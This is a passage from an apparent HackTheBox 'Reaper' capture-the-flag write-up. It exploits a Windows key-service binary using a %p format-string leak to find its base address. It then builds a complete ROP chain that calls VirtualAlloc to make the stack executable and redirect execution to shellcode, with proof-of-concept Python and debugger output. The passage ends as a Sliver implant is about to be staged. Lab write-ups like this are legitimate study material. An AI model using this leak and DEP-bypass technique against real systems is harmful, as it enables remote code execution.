option:\n4. Set key\n5. Activate key\n6. Exit\n2\nChecking key: 110-FE9A1-550-A271-0109, Comment: Standard License\nCould not find key!\nChoose an option:\n7. Set key\n8. Activate key\n9. Exit\n1\nEnter a key: %p\nInvalid key format\nChoose an option:\n10. Set key\n11. Activate key\n12. Exit\n2\nChecking key: 00007FF74BD10660\n, Comment: \nCould not find key!\nChoose an option:\n13. Set key\n14. Activate key\n15. Exit\n</code></pre> <p>I get a leak!</p> <pre><code>Checking key: 00007FF74BD10660\n, Comment:\n</code></pre> <p>Looking at windbg to see if I can identify what range the address is from:</p> <pre><code>Symbol search path is: srv*c:\\symbols;srv*C:\\symbols*https://msdl.microsoft.com/download/symbols;C:\\symbolsextra\nExecutable search path is: \nModLoad: 00007ff7`4bcf0000 00007ff7`4bd23000   C:\\reaper\\dev_keysvc.exe\nModLoad: 00007fff`c0630000 00007fff`c0828000   C:\\Windows\\SYSTEM32\\ntdll.dll\nModLoad: 00007fff`bef90000 00007fff`bf052000   C:\\Windows\\System32\\KERNEL32.DLL\nModLoad: 00007fff`bdfe0000 00007fff`be2d6000   C:\\Windows\\System32\\KERNELBASE.dll\nModLoad: 00007fff`c0360000 00007fff`c03cb000   C:\\Windows\\System32\\WS2_32.dll\nModLoad: 00007fff`c04d0000 00007fff`c05f0000   C:\\Windows\\System32\\RPCRT4.dll\nModLoad: 00007fff`bd370000 00007fff`bd3da000   C:\\Windows\\system32\\mswsock.dll\n</code></pre> <p>It is from <code>dev_keysvc.exe</code></p> <pre><code>ModLoad: 00007ff7`4bcf0000 00007ff7`4bd23000   C:\\reaper\\dev_keysvc.exe\n</code></pre> <p>Calculating the difference from base</p> <pre><code>In [4]: base=int(\"00007ff74bcf0000\",16)\n\nIn [5]: leak=int(\"00007FF74BD10660\",16)\n\nIn [6]: leak - base\nOut[6]: 132704\n\nIn [7]: f\"{leak - base:08x}\"\nOut[8]: '00020660'\n</code></pre> <p>The following formula captures the leaked address, deducts the offset to the base address of <code>dev_keysvc.exe</code>, then returns the base address.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat poc.py | awk -v RS=\"\" '/get_leak/'\n\ndef get_leak(sock):\n    # \u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n    # \u2514\u2500$ echo \"Hello\" | base64 -w0\n    # SGVsbG8=\n    bufs = [ \"1\\n\", \"110-FE9A1-550-A271-0109-SGVsbG8=\\n\", \"2\\n\", \"1\\n\", \"%p\\n\", \"2\\n\"]\n    for x in range(0,len(bufs)):\n        recvd = sock.recv(4096).decode('latin-1')\n        dprint(recvd)\n        if \"key format\" in recvd or 'Checking key' in recvd:\n            recvd = sock.recv(4096).decode('latin-1')\n            dprint(recvd)\n        print(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        sock.send(bufs[x].encode('latin-1'))\n    leak = sock.recv(4096).decode('latin-1').split(\"\\n\")[0].split(\" \")[2]\n    baseaddr = int(leak,16) - 132704\n    print(f\"** dev_keysvc leakaddr: 0x{leak} **\")\n    print(f\"** dev_keysvc baseaddr: 0x{baseaddr:016x} **\")\n    return baseaddr \n</code></pre> <p>The net result when executed: </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ ./poc.py 192.168.56.100:4141\n** dev_keysvc leakaddr: 0x00007FF74BD10660 **\n** dev_keysvc baseaddr: 0x00007ff74bcf0000 **\n</code></pre><p></p> <p>Time for some ROP gadgets to add the base to</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#finding-ropgadgets","title":"Finding ROPgadgets","text":"<p>The calling convention for x64 Windows, at least the first four arguments, is RCX, RDX, R8, and R9 (https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170).  So the call to VirtualAlloc needs to look like this:</p> <pre><code>LPVOID VirtualAlloc(\n    RCX=RSP+offset  // [in, optional] LPVOID lpAddress,\n    RDX=0x1000      // [in]           SIZE_T dwSize,\n    R8=0x1000       // [in]           DWORD  flAllocationType,\n    R9=0x40         // [in]           DWORD  flProtect\n);\n</code></pre> <p>For finding ROP gadgets, I have a tool I made that wraps around <code>rp++</code> and extends its capabilities a bit.  The tool is called <code>rp++-ng</code> (https://github.com/SYANiDE-/rp-ng).  Most of the capability revolves around the tool performing a collection of regex idioms against <code>rp++</code>, and using an <code>ncurses</code>-based menu to manually select gadgets (<code>space</code>) that you find to be interesting or maybe useful, and moving through each new regex pattern match (<code>q</code>).  At the end it displays all the selected gadgets in a consumable list.  Other capabilities, like filtering out duplicates, adjusting the base virtual address of the output, filtering out badchar opcodes, and other useful features.  </p> <p>In the below, I have set the VA for all gadgets to start at a base of <code>0x0</code> (as we'll be working in relative addresses to baseaddr of <code>dev_keysvc.exe</code>), gadgets max length 10 instructions, sorted (from shortest to longest length), remove duplicates (-u), and use a looser set of regex idioms for matching (-l).  </p> <p>Here is an initial list of gadgets I curated and selected, which I thought might be useful, who knows.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ rp++-ng --file dev_keysvc.exe --va 0x0 --roplen 10 -s -u -l 2&gt;/dev/null\n\n  rp++-ng?                           ^^           \n             _________ _________      ___ __  __________ `\n   .       |    _o___|    _o___ ++- |   \\  |/   /_____/  !\n          |___|\\____|___|%%%%%     |____\\_|\\___\\____.] \n  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' \n     ;                                    Chain faster\n              [[                            $$$$$ $$$$$$      i\n                    +                                    SYANiDE\n\n\n0x5af0: jmp r10 ; \n0x2cf2: jmp r11 ; \n0x5ade: jmp rax ; \n0x2cf3: jmp rbx ; \n0x2aac: jmp rcx ; \n0x38c8: jmp rdx ; \n0x1ef3d: jmp rdi ; \n0x2aab: jmp r9 ; \n0x37b9: call r8 ; \n0x3692: call rax ; \n0x1f324: call rbx ; \n0x184b8: call rdx ; \n0x158a: xor al, al ; ret ; \n0x25a0: xor eax, eax ; ret ; \n0x1fa1: xor ebx, esp ; ret ; \n0x1fa0: xor rbx, rsp ; ret ; \n0x1f27f: xor rax, rax ; ret ; \n0x3db5: push rdi ; ret ; \n0x53cd: push rax ; pop r14 ; ret ; \n0xfb0a: push rax ; pop rbp ; ret ; \n0x5d6d: push rax ; pop rdi ; ret ; \n0x1fc2: push rbx ; pop rax ; ret ; \n0x14b02: push rax ; pop r15 ; ret ; \n0x1e532: push rax ; pop rbx ; ret ; \n0x2bb9: push rsp ; add eax, esi ; ret ; \n0x47b3: pop r13 ; ret ; \n0x488f: pop r14 ; ret ; \n0x644d: pop r15 ; ret ; \n0x150a: pop rax ; ret ; \n0x259e: pop rbp ; ret ; \n0x20d9: pop rbx ; ret ; \n0x16f0: pop rdi ; ret ; \n0x4116: pop rsi ; ret ; \n0xa99c: pop rsp ; ret ; \n0x31dc: pop rcx ; clc ; ret ; \n0x31b6: pop rcx ; cld ; ret ; \n0xe97a: xchg eax, edx ; ret ; \n0x271c: xchg eax, esp ; ret ; \n0x15765: xchg eax, ebp ; ret ; \n0xae07: mov al, dl ; ret ; \n0x9ec5: mov al, r8L ; ret ; \n0x30f2: mov eax, ebx ; ret ; \n0x5437: mov eax, ecx ; ret ; \n0x1f81: mov ecx, eax ; ret ; \n0x1fb4: mov esp, ebx ; ret ; \n0x1fb3: mov r12, rbx ; ret ; \n0x30f1: mov rax, r11 ; ret ; \n0x1f381: mov rax, r9 ; ret ; \n0x5436: mov rax, rcx ; ret ; \n0x1f80: mov rcx, rax ; ret ; \n0x1402f: mov eax, edx ; ret ; \n0x1402e: mov rax, rdx ; ret ; \n0xa7cd: mov rsp, r11 ; pop rbp ; ret ; \n0x11a73: mov rsp, r11 ; pop r14 ; ret ; \n0x1cd19: mov rsp, r11 ; pop rdi ; ret ; \n0x1f90: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; \n0x1547f: mov rax, qword [rax] ; add rsp, 0x28 ; ret ; \n0x4524: mov rax, qword [rcx] ; mov [rdx+rax], r8d ; ret ; \n0x2b8d: mov rcx, qword [rdx] ; mov qword [rax], rcx ; ret ; \n0x2b55: mov r8, qword [rdx] ; movzx ecx, byte [rdx+0x08] ; mov qword [rax], r8 ; mov byte [rax+0x08], cl ; ret ; \n0x2b90: mov qword [rax], rcx ; ret ; \n0x5433: mov qword [rcx], rax ; mov rax, rcx ; ret ; \n0x2b69: mov qword [rax], r8 ; mov [rax+0x08], ecx ; ret ; \n0x1b90e: mov qword [r8], rax ; mov eax, 0x00000001 ; ret ; \n0x2b5c: mov qword [rax], r8 ; mov byte [rax+0x08], cl ; ret ; \n0x2b4d: mov qword [rax], r8 ; mov word [rax+0x08], cx ; ret ; \n0xa28c: mov qword [r8], rax ; xor eax, eax ; add rsp, 0x38 ; ret ; \n0xfdae: mov r14, qword [rsp+0x18] ; ret ; \n0x35af: mov rbx, qword [rsp+0x08] ; ret ; \n0xe410: mov rdi, qword [rsp+0x20] ; ret ; \n0x1c7e3: mov rsi, qword [rsp+0x18] ; pop rdi ; ret ; \n0x9ec0: mov rbx, qword [rsp+0x08] ; mov al, r8L ; ret ; \n0x2024: mov r11, qword [rsp+0x08] ; add rsp, 0x10 ; ret ; \n0x43f5: mov rax, qword [rax+0x60] ; add rsp, 0x28 ; ret ; \n0x743d: mov rbp, qword [rsp+0x50] ; add rsp, 0x30 ; pop rdi ; ret ; \n0x2851: mov rbx, qword [rsp+0x30] ; add rsp, 0x20 ; pop rdi ; ret ; \n0x4886: mov rdi, qword [rsp+0x40] ; add rsp, 0x20 ; pop r14 ; ret ; \n0x6444: mov rdi, qword [rsp+0x40] ; add rsp, 0x20 ; pop r15 ; ret ; \n0x7003: mov qword [r9+0x40], rax ; ret ; \n0x159f: mov qword [rsp+0x20], r9 ; ret ; \n0xe1a0: mov qword [rcx+0x08], rax ; ret ; \n0x31da: mov qword [rcx-0x08], r11 ; ret ; \n0x102fc: mov qword [rcx+0x10], rax ; xor eax, eax ; ret ; \n0x159a: mov qword [rsp+0x18], r8 ; mov qword [rsp+0x20], r9 ; ret ; \n0xe272: mov qword [rcx+0x08], r9 ; mov [rcx+0x28], 0x0000000A ; ret ; \n0xd99d: inc eax ; ret ; \n0xd99c: inc rax ; ret ; \n0xecec: inc ebx ; lea rax, qword [rax+rcx-0x02] ; ret ; \n0x152fb: inc qword [rdx] ; movzx eax, cl ; ret ; \n0x17e3c: dec eax ; ret ; \n0xe4a2: dec qword [rax] ; mov al, 0x01 ; add rsp, 0x20 ; pop rdi ; ret ; \n0x391b: add rax, r8 ; ret ; \n0x5e9e: add eax, ecx ; ret ; \n0x2bba: add eax, esi ; ret ; \n0x5e9d: add rax, rcx ; ret ; \n0x391c: add eax, eax ; ret ; \n0x1e20e: add esi, esi ; ret ; \n0x3918: add r8, r9 ; add rax, r8 ; ret ; \n0x10949: sub eax, ecx ; ret ; \n0x1fb1: sub ebx, eax ; mov r12, rbx ; ret ; \n0x1fb0: sub rbx, rax ; mov r12, rbx ; ret ; \n0x13e54: sub rcx, r9 ; mov rax, rcx ; ret ; \n0x14027: sub rdx, r8 ; sar rdx, 1 ; mov rax, rdx ; ret ; \n0xecfd: or ah, bh ; ret ; \n0xed15: or al, bh ; ret ; \n0xeceb: or bh, bh ; ret ; \n0xed03: or bl, bh ; ret ; \n0xecf7: or ch, bh ; ret ; \n0xed0f: or cl, bh ; ret ; \n0xecf1: or dh, bh ; ret ; \n0xed09: or dl, bh ; ret ; \n0x1d6f7: or eax, ebp ; ret ; \n0x1bd3f: or eax, edx ; ret ; \n0x1bd95: or eax, r8d ; ret ; \n0x1bd8c: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; \n0x1bd89: or r8d, ecx ; or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; \n0xd99a: neg eax ; inc rax ; ret ; \n0xd999: neg rax ; inc rax ; ret ; \n0x24ea: neg eax ; dec eax ; add rsp, 0x28 ; ret ; \n0x53cd: push rax ; pop r14 ; ret ; \n0xfb0a: push rax ; pop rbp ; ret ; \n0x5d6d: push rax ; pop rdi ; ret ; \n0x1fc2: push rbx ; pop rax ; ret ; \n0x14b02: push rax ; pop r15 ; ret ; \n0x1e532: push rax ; pop rbx ; ret ;\n</code></pre> <p>I had a really hard time finding gadgets that even do anything with registers <code>r8</code> and <code>r9</code>, so I needed to perform an additional search using regex to try and collect additional gadgets which, may have been missed by standard and looser idioms.</p> <p>The hunt is meager.  I found only one gadget that can do something to <code>r9</code> as a destination register, so that is going to have to be a basis.  The following gadgets are going to have to do, maybe I missed something but it seems that this is all there is that are remotely rational.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ rp++-ng --file dev_keysvc.exe --va 0x0 --roplen 10 -s -u -R \"(push|pop|xchg|mov|xor|add|sub|and|or|not|neg) (r8|r9)(, (...|r8|r9))?.*ret\" 2&gt;/dev/null\n\n  rp++-ng?                           ^^           \n             _________ _________      ___ __  __________ `\n   .       |    _o___|    _o___ ++- |   \\  |/   /_____/  !\n          |___|\\____|___|%%%%%     |____\\_|\\___\\____.] \n  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' \n     ;                                    Chain faster\n              [[                            $$$$$ $$$$$$      i\n                    +                                    SYANiDE\n\n\n0x3918: add r8, r9 ; add rax, r8 ; ret ; \n0x1f90: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; \n0x1f93: mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; \n0x1bd8c: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; \n0x2b55: mov r8, qword [rdx] ; movzx ecx, byte [rdx+0x08] ; mov qword [rax], r8 ; mov byte [rax+0x08], cl ; ret ; \n0x2b46: mov r8, qword [rdx] ; movzx ecx, word [rdx+0x08] ; mov qword [rax], r8 ; mov word [rax+0x08], cx ; ret ; \n0x1bd89: or r8d, ecx ; or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; \n</code></pre> <p>It's a good starting point, but I've found typically I need to do some spot-searching for additional gadgets, that's where regex comes in handy.</p> <p>As for the call to <code>VirtualAlloc</code>, it is in the IAT </p> <pre><code>    7ff74bd10000 58 b6 02        addr       KERNEL32.DLL::VirtualAlloc\n                 00 00 00 \n                 00 00\n</code></pre> <p>It will need to be dereferenced in order to get the real address.</p> <p>Let the ROPchaining begin.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#ropchaining","title":"ROPchaining","text":"<p>First, create an <code>sqlite</code> database and import the gadgets.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ sqlite3 gadgets.db\nSQLite version 3.46.1 2024-08-13 09:16:08\nEnter \".help\" for usage hints.\nsqlite&gt; create table gadgets( gadget varchar );\nsqlite&gt; .import gadgets.txt gadgets\nsqlite&gt; .q\n</code></pre> <p>Easier to find relevant gadgets now, wherever I'm at</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ sqlite3 gadgets.db \"select gadget from gadgets where gadget like '%r9%'\"\n0x2aab: jmp r9 ; \n0x1f381: mov rax, r9 ; ret ; \n0x1f90: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; \n0x7003: mov qword [r9+0x40], rax ; ret ; \n0x159f: mov qword [rsp+0x20], r9 ; ret ; \n0x159a: mov qword [rsp+0x18], r8 ; mov qword [rsp+0x20], r9 ; ret ; \n0xe272: mov qword [rcx+0x08], r9 ; mov [rcx+0x28], 0x0000000A ; ret ; \n0x3918: add r8, r9 ; add rax, r8 ; ret ; \n0x13e54: sub rcx, r9 ; mov rax, rcx ; ret ; \n0x3918: add r8, r9 ; add rax, r8 ; ret ; \n</code></pre> <p>I have a function for creating <code>struct.pack</code>'ed data of arbitrary format </p><pre><code>def packlatin(fmt, inp):\n        return pack(fmt, inp).decode('latin-1')\n</code></pre><p></p> <p>And a function for building a ROPchain, takes a base address and adds the base to RVAs, packs the values as qwords, and concatenates the values as a single string.</p> <pre><code>def ROPchain1(base):\n    return \"\".join([packlatin(\"&lt;Q\",x) for x in [\n        base+0x20d9,        #: pop rbx ; ret ;\n        0x1000,\n        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;\n        0xfeedcafedeadbeef,\n\n    ]])\n</code></pre> <p>In order to debug the ROPchain, I need to figure out the exact return address that  crashes.  As it turns out, it is the return instruction of the function I step over, not a nested return.  <code>00007ff74bcf16f1</code></p> <p></p> <p>For reference we're talking about this function here:</p> <p></p> <p>I set a breakpoint for the address of the return instruction at the end of <code>crash_in_here</code>, after the three continues, that way I can step into the return, which takes me right to the ROPchain.</p> <pre><code>((cmd.exe /c \"taskkill /F /IM dev_keysvc.exe\" &amp;&amp; timeout 1 &amp;&amp; START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) || START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) &amp;&amp; timeout 1 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g;'\n</code></pre> <p>When I resend the payload, execution stops at the return instruction.  I step into it, and I am in the ROPchain:</p> <pre><code>00007fff`c06d10d0 cc              int     3\n0:003&gt; bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g;\nModLoad: 00007fff`bbb30000 00007fff`bbb42000   C:\\Windows\\SYSTEM32\\kernel.appcore.dll\nModLoad: 00007fff`bf620000 00007fff`bf6be000   C:\\Windows\\System32\\msvcrt.dll\nBreakpoint 0 hit\n*** WARNING: Unable to verify checksum for C:\\reaper\\dev_keysvc.exe\nBreakpoint 0 hit\nBreakpoint 0 hit\nBreakpoint 1 hit\ndev_keysvc+0x16f1:\n00007ff7`4bcf16f1 c3              ret\n0:003&gt; t\ndev_keysvc+0x20d9:\n00007ff7`4bcf20d9 5b              pop     rbx\n</code></pre> <p>Rather than bore with the gritty details, lets jump straight to the ROPchain I settled on.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#final-ropchain","title":"Final ROPchain","text":"<p><code>r8</code> and <code>r9</code> are going to be the hardest to work around, due to the lack of gadgets so the options are limited.</p> <p>The one gadget I have to work with for <code>r9</code> nukes <code>r8</code> in the process, so need to get <code>r9</code> right out of the way.  I'll pop <code>0x40</code> into <code>rbx</code>, then use the one gadget to <code>mov r9, rbx</code>.  Consequentially, <code>r8</code> gets nulled.  And <code>rsp</code> gets <code>0x08</code> added to it, so need  a dummy qword to realign.</p> <pre><code>        ## 0x1000 to r9\n        base+0x20d9,        #: pop rbx ; ret ;\n        0x40,\n        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;\n        0xfeedcafedeadbeef,\n</code></pre> <p><code>r8</code> is a little more nuanced.  I'll pop <code>0x1000</code> into <code>rax</code>, exchange <code>eax</code> and <code>edx</code> , then <code>or</code> <code>edx</code> against <code>r8d</code>, net-effect is like a <code>mov</code>.  The rest of the instructions do not affect my setup for the <code>VirtualAlloc</code> call or existing registers to that end.</p> <pre><code>        ## 0x1000 to r8\n        base+0x150a,        #: pop rax ; ret ;\n        0x1000,\n        base+0xe97a,        #: xchg eax, edx ; ret ;\n        base+0x1bd8c,       #: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;\n</code></pre> <p><code>rdx</code> is even easier, because its already <code>0x1000</code> as a consequence of setting for <code>r8</code></p> <pre><code>        ## 0x1000 to rdx\n        ## Nothing needed, rdx is already 0x1000 because of r8 above\n\n        # 0:003&gt; r\n        # rax=0000000000001000 rbx=0000000000000040 rcx=75370cfeeea40000\n        # rdx=0000000000001000 rsi=0000000000000000 rdi=4141414141414141\n        # rip=00007ff74bcf1fa0 rsp=000000f65adfe690 rbp=0000000000000000\n        # r8=0000000000001000  r9=0000000000000040 r10=0000000000000000\n        # r11=000000f65adfe560 r12=0000000000000000 r13=0000000000000000\n        # r14=0000000000000000 r15=0000000000000000\n</code></pre> <p><code>rcx</code> is the most complex of the four registers, but not by much.  <code>rbx</code> is already <code>0x40</code>, and the address doesn't have to be exacting because the <code>VirtualAlloc</code> is done on an entire page, any address within it will do.  Now is a good time to save <code>rbx</code>, because it has an approximate address in the range of where we eventually jump after <code>VirtualAlloc</code>.  So that gets saved to <code>r12</code> for the end.  Push <code>rbx</code> and pop back in <code>rax</code>, then <code>mov rcx</code>.  </p> <pre><code>        ## rsp to rcx\n        base+0x1fa0,        #: xor rbx, rsp ; ret ;\n        base+0x1fb3,        #: mov r12, rbx ; ret ;  ## for jmp/call rax later\n        base+0x1fc2,        #: push rbx ; pop rax ; ret ;\n        base+0x1f80,        #: mov rcx, rax ; ret ;\n</code></pre> <p>And then there's calling <code>VirtualAlloc</code>.  The address of <code>VirtualAlloc</code> from the IAT Import Address Table gets popped into <code>rax</code>.  However we can't call that directly, it needs to be dereferenced first.  That is made possible by the <code>mov rax, qword [rax]</code>, which takes the value pointed at by <code>rax</code> and places that into <code>rax</code>.  The cost of this gadget is that <code>rsp</code> gets incremented by <code>0x28</code>, so five dummy qwords are placed on the stack afterward to realign.  The <code>ret</code> statement of that gadget net-effect jumps over those five qwords and lands at the <code>push rax</code> gadget.  <code>rax</code> is pushed onto the stack, popped back into <code>rdi</code>.  Then <code>rdi</code> is pushed onto the stack, and <code>ret</code>urned to. </p> <pre><code>        ## call VirtualAlloc\n        base+0x150a,        #: pop rax ; ret ;\n        base+0x20000,       ## IAT VirtualAlloc VA\n        base+0x1547f,       #: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        base+0x5d6d,        #: push rax ; pop rdi ; ret ;\n        base+0x3db5,        #: push rdi ; ret ;\n</code></pre> <p>The call to <code>VirtualAlloc</code> requires a scratch area, \"shadow space\", <code>rsp</code> immediately following the call.  Callee is responsible for stack cleanup, which means <code>rsp</code> needs to be realigned after <code>VirtualAlloc</code>.  The convention calls for 32 bytes (0x20).  I found a gadget for adding <code>0x28</code> to <code>rsp</code>.  </p> <pre><code>        ## realign RSP, RE: shadow space / VA scratch area\n        base+0x175b,          #: add rsp, 0x28 ; ret ;\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n</code></pre> <p>Finally, a chain for controlling <code>rip</code>.  The following adds an offset to the <code>rsp</code> (at the time) that was <code>xor</code>'d into <code>rbx</code>, and then saved into <code>r12</code>.  And then jumps there.</p> <pre><code>        ## jmp/call rsp\n        base+0x150a,        #: pop rax ; ret ;\n        0xf0,\n        base+0x368c         #: add rax, r12 ; mov rdx, r13 ; call rax ;\n</code></pre> <p>The final ROPchain</p> <pre><code>def ROPchain1(base):\n    ## crashtime regs\n    # 0:003&gt; r\n    # rax=00000000ffffffff rbx=000001e554b7bc60 rcx=4a4db4eaa5a70000\n    # rdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141\n    # rip=00007ff766a816f1 rsp=000000d2a29fe908 rbp=0000000000000000\n    # r8=0000000000000054  r9=0000000000000054 r10=0000000000000007\n    # r11=000000d2a29fe820 r12=0000000000000000 r13=0000000000000000\n    # r14=0000000000000000 r15=0000000000000000\n    # iopl=0         nv up ei pl nz na po nc\n    # cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206\n    return \"\".join([packlatin(\"&lt;Q\",x) for x in [\n        ## 0x40 to r9\n        base+0x20d9,        #: pop rbx ; ret ;\n        0x40,\n        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;\n        0xfeedcafedeadbeef,\n\n        ## 0x1000 to r8\n        base+0x150a,        #: pop rax ; ret ;\n        0x1000,\n        base+0xe97a,        #: xchg eax, edx ; ret ;\n        base+0x1bd8c,       #: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;\n\n        ## 0x1000 to rdx\n        ## Nothing needed, rdx is already 0x1000 because of r8 above\n\n        # 0:003&gt; r\n        # rax=0000000000001000 rbx=0000000000000040 rcx=75370cfeeea40000\n        # rdx=0000000000001000 rsi=0000000000000000 rdi=4141414141414141\n        # rip=00007ff74bcf1fa0 rsp=000000f65adfe690 rbp=0000000000000000\n        # r8=0000000000001000  r9=0000000000000040 r10=0000000000000000\n        # r11=000000f65adfe560 r12=0000000000000000 r13=0000000000000000\n        # r14=0000000000000000 r15=0000000000000000\n\n\n        ## rsp to rcx\n        base+0x1fa0,        #: xor rbx, rsp ; ret ;\n        base+0x1fb3,        #: mov r12, rbx ; ret ;  ## for jmp/call rsp later\n        base+0x1fc2,        #: push rbx ; pop rax ; ret ;\n        base+0x1f80,        #: mov rcx, rax ; ret ;\n\n        ## call VirtualAlloc\n        base+0x150a,        #: pop rax ; ret ;\n        base+0x20000,       ## IAT VirtualAlloc VA\n        base+0x1547f,       #: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        base+0x5d6d,        #: push rax ; pop rdi ; ret ;\n        base+0x3db5,        #: push rdi ; ret ;\n\n        ## realign RSP, RE: shadow space / VA scratch area\n        base+0x175b,          #: add rsp, 0x28 ; ret ;\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n\n        ## jmp/call rsp\n        base+0x150a,        #: pop rax ; ret ;\n        0xf0,\n        base+0x368c         #: add rax, r12 ; mov rdx, r13 ; call rax ;\n</code></pre> <p>When I step through execution to the <code>ret</code> instruction in the last gadget for calling <code>VirtualAlloc</code>,  <code>push rdi ; ret ;</code>, and check memory protection on <code>rsp</code>, the protection is <code>0x4</code> <code>PAGE_READWRITE</code>:</p> <pre><code>0:003&gt; \ndev_keysvc+0x3db5:\n00007ff7`4bcf3db5 57              push    rdi\n0:003&gt; \ndev_keysvc+0x3db6:\n00007ff7`4bcf3db6 c3              ret\n0:003&gt; !vprot rsp\nBaseAddress:       000000dc9fafe000\nAllocationBase:    000000dc9fa00000\nAllocationProtect: 00000004  PAGE_READWRITE\nRegionSize:        0000000000002000\nState:             00001000  MEM_COMMIT\nProtect:           00000004  PAGE_READWRITE\nType:              00020000  MEM_PRIVATE\n</code></pre> <p>If I step through and step out of <code>VirtualAlloc</code>, then re-check protection, it has been updated, and protection is now <code>0x40</code> <code>PAGE_EXECUTE_READWRITE</code></p> <pre><code>0:003&gt; t\nKERNEL32!VirtualAllocStub:\n00007fff`befa8840 48ff25e9c30600  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007fff`bf014c30)] ds:00007fff`bf014c30={KERNELBASE!VirtualAlloc (00007fff`be03fd10)}\n0:003&gt; pt\nKERNELBASE!VirtualAlloc+0x5a:\n00007fff`be03fd6a c3              ret\n0:003&gt; t\ndev_keysvc+0x2bb9:\n00007ff7`4bcf2bb9 54              push    rsp\n0:003&gt; !vprot rsp\nBaseAddress:       000000dc9fafe000\nAllocationBase:    000000dc9fa00000\nAllocationProtect: 00000004  PAGE_READWRITE\nRegionSize:        0000000000002000\nState:             00001000  MEM_COMMIT\nProtect:           00000040  PAGE_EXECUTE_READWRITE\nType:              00020000  MEM_PRIVATE\n</code></pre> <p>Stepping through <code>call rax</code>, I land in nopsled1:</p> <pre><code>0:003&gt; dd rax\n00000052`0d3fe800  90909090 90909090 90909090 90909090\n00000052`0d3fe810  90909090 90909090 90909090 90909090\n00000052`0d3fe820  90909090 90909090 90909090 90909090\n00000052`0d3fe830  90909090 90909090 90909090 90909090\n00000052`0d3fe840  43434343 43434343 43434343 43434343\n00000052`0d3fe850  43434343 43434343 43434343 43434343\n00000052`0d3fe860  43434343 43434343 43434343 43434343\n00000052`0d3fe870  43434343 43434343 43434343 43434343\n</code></pre> <p>The following stub breaks right to the <code>call rax</code> instruction after sending the payload: </p><pre><code>((cmd.exe /c \"taskkill /F /IM dev_keysvc.exe\" &amp;&amp; timeout 1 &amp;&amp; START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) || START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) &amp;&amp; timeout 1 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g; t 33; p; pt; t 7'\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#getting-the-shell","title":"Getting the shell","text":"<p>With the ROPchain completed, and execution flow controlled on the stack, the only thing left to do is generate some shellcode and get a shell.</p> <p>I'll use a staged <code>Sliver</code> implant.</p> <p>I start <code>sliver-server</code>, enable 